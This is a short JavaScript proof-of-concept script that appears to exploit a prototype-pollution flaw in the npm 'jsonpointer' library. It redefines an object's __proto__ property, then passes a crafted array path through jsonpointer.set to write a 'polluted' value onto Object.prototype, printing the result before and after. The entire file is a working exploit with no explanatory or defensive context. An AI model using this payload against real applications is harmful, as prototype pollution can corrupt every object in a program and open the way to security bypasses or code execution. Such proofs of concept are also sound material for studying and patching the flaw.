var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const jsonpointer = require('jsonpointer');
console.log({}.polluted);
jsonpointer.set(obj, [
    ['proto'],
    [
        'constructor',
        'prototype'
    ],
    'polluted'
], 'yes');
console.log({}.polluted);